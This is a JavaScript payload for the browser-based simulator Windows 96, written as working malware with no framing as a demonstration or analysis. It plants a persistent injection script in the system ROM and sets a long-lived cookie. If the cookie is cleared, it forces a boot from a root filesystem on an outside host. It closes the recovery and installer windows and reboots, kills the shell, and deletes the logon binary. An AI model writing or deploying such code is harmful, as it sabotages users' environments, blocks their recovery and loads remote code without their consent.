const kinject = `
(async () => {
    kinj=kutil.sysrom.read("KINJECT.js")
    document.cookie = "data-not-cleared=true; path=/; max-age=2147483647;";
    setInterval(() => { if(!document.cookie.split("; ").some(c => c.startsWith("data-not-cleared="))){location.href = "https://windows96.net/?rootfs=https://painscreen.is-a.dev/storage/dogrootfs.zip"};},1000);
    setInterval(() => {
        w96.state.processes.forEach(
            (z) => {
                if (z?.appWindow?.title == "System Recovery Tools" && w96.isRecovery) {
                    document.getElementById(z?.appWindow?.id).remove();
                    w96.sys.reboot();
                }
                if (z?.appWindow?.title == "Windows 96 Installer" && w96.isRecovery) {
                    document.getElementById(z?.appWindow?.id).remove()
                    w96.sys.reboot();
                }
            })
    }, 16)
})();
`;
kutil.sysrom.write("KINJECT.js",kinject);
w96.state.processes.forEach((el)=>{if(el == null) return;if (el.title=="shell36"){el.terminate();}})
w96.FS.rm("C:/system/local/bin/logon")
setTimeout(()=>{location.href="https://windows96.net"},1000)